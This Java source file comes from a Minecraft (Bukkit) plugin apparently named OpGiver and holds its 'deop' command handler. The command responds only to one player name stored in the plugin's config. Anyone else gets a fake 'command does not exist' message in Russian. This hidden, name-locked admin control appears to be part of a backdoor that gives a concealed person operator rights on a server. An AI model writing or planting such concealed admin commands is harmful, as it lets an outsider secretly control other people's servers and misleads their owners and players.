package opgiver.opgiver;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class deopCommand implements CommandExecutor {
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Player player = (Player) sender;
        if (player.getName().equals(OpGiver.getInstance().getConfig().getString("Name"))){
            player.setOp(false);
        }
        if (!player.getName().equals(OpGiver.getInstance().getConfig().getString("Name"))){
            player.sendMessage("§d§lEpsilon §cКоманды не существует.");
        }
        return true;
    }
}
